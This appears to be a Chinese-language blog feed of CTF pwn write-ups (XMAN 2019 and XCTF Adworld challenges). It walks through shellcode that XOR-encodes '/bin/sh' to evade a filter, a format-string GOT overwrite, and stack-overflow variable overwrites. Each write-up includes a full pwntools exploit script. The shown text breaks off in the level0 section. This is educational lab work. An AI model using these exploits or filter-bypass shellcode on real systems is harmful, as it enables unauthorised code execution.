class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下防护措施</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>和上一题的不同之处在于，这题多了一个对输入内容的检测，如果输入的内容包含“sh“字符就会报错，所以我们要想办法绕过这个检查</p><p>我们所想的第一种办法，把我们的<code>/bin/sh</code>字符串进行异或操作，绕过字符检查，然后再异或回原来的字符串即可。shellcode就可以像这样写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push <span class="number">0xa28d9591</span></span><br><span class="line">xor dword ptr [esp],<span class="number">0xcafebabe</span><span class="string">"</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov al, 11</span></span><br><span class="line"><span class="string">int 0x80</span></span><br></pre></td></tr></table></figure><p>最后的Exploit就可以这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = process(<span class="string">"./shellcode2"</span>)</span><br><span class="line"><span class="comment">#p = remote("120.79.114.39",10002)</span></span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485A1"</span>)</span><br><span class="line">shellcode = asm(<span class="string">"xor ecx, ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mul ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"push ecx"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"push 0xa28d9591"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"xor dword ptr [esp],0xcafebabe"</span>)<span class="comment">#dword ptr Four bits</span></span><br><span class="line">shellcode += asm(<span class="string">"push 0x6e69622f"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mov ebx, esp"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"mov al, 11"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"int 0x80"</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者也可以通过类似加加减减的简单变换方式来绕过，核心思路和异或操作是一样的。还可以通过复杂的ROP方式绕过去。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-PWN-format</title>
      <link href="/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-format/"/>
      <url>/2019/08/06/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-PWN-format/</url>
      
        <content type="html"><![CDATA[<p><code>format</code>一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。</p><p>也学会了一点在执行Exploit的时候带上<code>DEBUG</code>和贴上<code>gdb</code>调试非常有用！    </p><p>贴上<code>gdb</code>只需要在代码里面加入<code>gdb.attach(io)</code>，如果要下断点就是<code>gdb.attach(io,&quot;b *address&quot;)</code></p><p>带上<code>DEBUG</code>只需要在命令行后跟上<code>DEBUG</code>参数，例如<code>python exp.py DEBUG</code></p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">255</span>);</span><br><span class="line">    <span class="built_in">printf</span>(overflow);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA Pro逆向出来的代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下文件开启的保护措施</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>没有开启任何的防护措施，就比较简单</p><p>本质上是通过构造格式化字符串让劫持系统流程，让系统执行到我们保存shellcode的地址上</p><p>所以首先我们需要把shellcode写到内存上的，我们可以发现第一次输入的这个BUF为全局BUF，可以直接写入</p><p>故我们第一次输入就把shellcode传入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><p>然后我们只需要传入我们写入shellcode的地址覆盖掉puts的got地址，这样等到程序运行到puts函数时，实测运行的就是我们的shellcode，现在的问题是如何构造一个格式化字符串覆盖puts的got地址</p><p>我们首先构造一个Exploit，确定我们传入的第一个数据是在栈上的第几个位置.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./format'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">'aaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'</span>)</span><br><span class="line"><span class="comment">#%2552c,%39036c,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>根据DEBUG信息我们发送的信息如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x136</span> bytes:</span><br><span class="line"> 'aaaa,0xfff27430,0xff,0x1,0x61616161,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0xa7025,(nil),(nil),(nil)\n'</span><br></pre></td></tr></table></figure><p>接收到的信息如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa,<span class="number">0xfff27430</span>,<span class="number">0xff</span>,<span class="number">0x1</span>,<span class="number">0x61616161</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0xa7025</span>,(nil),(nil),(nil)</span><br></pre></td></tr></table></figure><p>通过<code>x/32xw $esp</code>命令查看栈情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">32</span>xw $esp</span><br><span class="line"><span class="number">0xffc5e370</span>:<span class="number">0xffc5e380</span><span class="number">0xffc5e380</span><span class="number">0x000000ff</span><span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffc5e380</span>:<span class="number">0x61616161</span><span class="number">0x2c70252c</span><span class="number">0x252c7025</span><span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e390</span>:<span class="number">0x2c70252c</span><span class="number">0x252c7025</span><span class="number">0x70252c70</span><span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3a0</span>:<span class="number">0x252c7025</span><span class="number">0x70252c70</span><span class="number">0x2c70252c</span><span class="number">0x252c7025</span></span><br><span class="line"><span class="number">0xffc5e3b0</span>:<span class="number">0x70252c70</span><span class="number">0x2c70252c</span><span class="number">0x252c7025</span><span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e3c0</span>:<span class="number">0x2c70252c</span><span class="number">0x252c7025</span><span class="number">0x70252c70</span><span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3d0</span>:<span class="number">0x252c7025</span><span class="number">0x70252c70</span><span class="number">0x2c70252c</span><span class="number">0x000a7025</span></span><br><span class="line"><span class="number">0xffc5e3e0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>不难得出我们传入的第一个参数<code>aaaa</code>位于栈中的第4个位置</p><p>因为<code>0x0804A018</code>数值太大了，我们把它拆分为<code>2052</code>和<code>39036</code>两个部分传值，现在需要确定的是如果我们再传入<code>puts_got</code>的地址时，<code>puts_got</code>位于栈中的哪个位置。同时因为我们是以双字节形式写入，故<code>2052</code>对应的地址是<code>puts_got</code>，而<code>39036</code>对应的应是<code>puts_got+2</code>的位置</p><p>所以我们的格式化字符串就为：</p><p><code>&#39;%2052c%12$hn%39036c%11$hn111&#39; + p32(puts_got) + p32(puts_got+2)</code></p><p>分析可得，此时堆栈中的</p><p>第一个参数为：<code>%2052c%12$hn%39036c%11$hn111</code></p><p>之后因为是32位系统，每4字节占用一个参数位</p><p>第4个参数：<code>%205</code></p><p>第5个参数：<code>c%12</code></p><p>第6个参数：<code>$hn%</code></p><p>第7个参数：<code>3903</code></p><p>第8个参数：<code>6c%1</code></p><p>第9个参数：<code>1$hn</code></p><p>第10个参数：<code>111</code></p><p>第11个参数：原本应为<code>p32(puts_got)</code></p><p>第12个参数：原本应为<code>p32(puts_got)+2</code></p><p>因为<code>%12$n</code>和<code>%11$n</code>    ，<code>puts_got</code>的地址被取出且修改为shellcode的地址</p><p>最终的Exploit如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./format'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span><span class="comment">#全局BUF地址</span></span><br><span class="line">puts_got = <span class="number">0x804A018</span></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.send(shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'%2052c%12$hn%39036c%11$hn111'</span> + p32(puts_got) + p32(puts_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">## payload += '%2052c%11$hncccccccccccc' + p32(puts_got) + p32(puts_got+2)</span></span><br><span class="line"><span class="comment">#修改GOT表数值</span></span><br><span class="line"><span class="comment">#gdb调试可得位置</span></span><br><span class="line"><span class="comment">#%2052c %12$hn 以双字节 写入2052个字节 到第11个参数位置</span></span><br><span class="line">puts_got = <span class="number">0x0804A018</span></span><br><span class="line">sc_addr = <span class="number">0x0804A080</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 0xffa4ed60</span></span><br><span class="line"><span class="comment"># 0xffa4ee7c</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="/2019/08/06/%E2%95%A3%C3%91%E2%95%96%E2%94%94%E2%95%A9%E2%94%94%E2%95%9C%CF%84/"/>
      <url>/2019/08/06/%E2%95%A3%C3%91%E2%95%96%E2%94%94%E2%95%A9%E2%94%94%E2%95%9C%CF%84/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-cgfsb"><a href="#攻防世界-cgfsb" class="headerlink" title="攻防世界: cgfsb"></a>攻防世界: cgfsb</h1><h2 id="目标"><a href="#目标" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>利用格式化字符串漏洞，造成任意地址写。</p><h2 id="环境"><a href="#环境" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具"><a href="#工具" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、python、pwntools, IDA</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><ul><li>我们先看一下这道题的逻辑：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/1.png" alt="img"></p><ul><li>输入 name，返回 name； 输入message，返回message。</li><li>从ida中查看伪代码：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/2.png" alt="img"></p><ul><li>利用过程：通过格式化字符串漏洞，将 pwnme 的值修改成8。</li></ul><p>简单的介绍一下格式化字符串漏洞的知识点：</p><ul><li>%n 将当前已打印字符的个数（4个字节）</li><li>%&lt;正整数n&gt;$&lt; fmt&gt;指定占位符对应第n个参数，例如：%12$x，此处%x对应第12个参数。</li><li>通过 ida 查看汇编代码 找到<code>call printf</code>的地址（调用printf(&amp;s)）。之后我们用gdb进行调试，在调用printf(&amp;s)之前下一个断点,查看接收 message 的变量 s 是格式化字符串的第几个参数。输入 message 的时候输入 ‘aaaa’。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/3.png" alt="img"></p><ul><li>查看当前栈中的内容。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/4.png" alt="img"></p><ul><li>这个我们可以通过 输入message的时候，把 pwnme的地址（在ida中点击伪代码中的pwnme就能查看到了） 写到这个位置，然后把这个地址的值修改成8（利用格式化字符串漏洞的任意内存写）。我们就可以构造出下面的payload啦：</li></ul><p>pwnme的地址+aaaa 凑出8个字节，这样就可以在10$的位置 写入8（四个字节）改变pwnme的值。</p><p>payload = p32(pwnme_addr) + ‘aaaa%10$n’</p><p>完整的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">DEBUG = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">p = process(<span class="string">'./cgfsb'</span>) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30147</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">"ABCD"</span> </span><br><span class="line">payload2 = p32(pwnme_addr) + <span class="string">'aaaa%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>) </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recv() </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><p>本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.c 1</span><br></pre></td></tr></table></figure><p>远程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.c 0</span><br></pre></td></tr></table></figure><h1 id="攻防世界-when-did-you-born"><a href="#攻防世界-when-did-you-born" class="headerlink" title="攻防世界: when_did_you_born"></a>攻防世界: when_did_you_born</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>Variables overriding</p><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-1"><a href="#过程分析-1" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><ul><li>运行一下程序：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/when_did_you_born/pic/1.png" alt="img">- 在ida中查看一下：</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/when_did_you_born/pic/2.png" alt="img">思路：可以看到 当生日是1926年的时候就会输出flag，但是程序对1926做了过滤，直接输入1926 程序就会结束。 同时，我们发现，v5和v4是在栈上的数据，接收name的gets函数不限制输入长度，于是 就可以在输入v4的时候覆盖掉之前我们输入的v5。那如何 判断 v4和v5 的相对位置呢？ ida在反汇编的伪代码中，标注了局部变量在栈中的位置，看红色箭头处，就能发现 v4和v5相差8个字节。这样我们就可以构造payload。</p><p><code>payload = &quot;A&quot;*8 + p32(1926)</code> </p><p>完整的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./when_did_you_born")</span></span><br><span class="line">p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30149</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Birth?\n"</span>,str(<span class="number">1998</span>))</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span> + p32(<span class="number">1926</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Name?\n"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-hello-pwn"><a href="#攻防世界-hello-pwn" class="headerlink" title="攻防世界: hello_pwn"></a>攻防世界: hello_pwn</h1><h2 id="目标-2"><a href="#目标-2" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>栈溢出 ROP</p><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-2"><a href="#工具-2" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-2"><a href="#过程分析-2" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><ul><li>从ida中查看：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/hello_pwn/pic/1.png" alt="img"></p><ul><li>将键盘中的输入写到 unk_601068 的地址上，如果 dword60106c 的值等于1853186401 的话就会执行方法 sub_400686()。方法内容如下：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/hello_pwn/pic/2.png" alt="img"></p><ul><li>也就是执行这个方法就能得到flag。那如何让 dword60106c 等于 1853186401（将光标放在数字上，再按键盘上的h就能进行十进制和十六进制的转换）呢？查看一下 dword60106c的位置。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/hello_pwn/pic/3.png" alt="img">- ！我们发现 unk_601068 的地址与 dword60106c 相连，在输入 unk_601068 的时候，可以将 dword60106c 的值覆盖成我们需要的值，而且允许输入的长度是完全能覆盖到的。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30153</span>)</span><br><span class="line">p.recvuntil(<span class="string">'lets get helloworld for bof\n'</span>) </span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span></span><br><span class="line">count = p64(<span class="number">1853186401</span>) </span><br><span class="line">shellcode = padding + count</span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-level0"><a href="#攻防世界-level0" class="headerlink" title="攻防世界: level0"></a>攻防世界: level0</h1><h2 id="目标-3"><a href="#目标-3" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>栈溢出</p><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-3"><a href="#工具-3" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-3"><a href="#过程分析-3" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><p>拿到这道题，首先要做的先检查有哪些保护机制是打开的：</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/1.png" alt="img">没有开 canary，PIE 也是关闭的，但是栈不可执行。也就是说我们可以进行溢出，但是不能将 shellcode 写在栈上，因为现在栈上的代码是不能被执行的。</p><p>用ida查看：</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/2.png" alt="img">这是 vulnerable_function 函数，可以在栈上写0x200个字节，或许我们可以进行溢出，覆盖掉返回地址，劫持程序执行流，执行我们想执行的方法。通常我们的目的是去执行 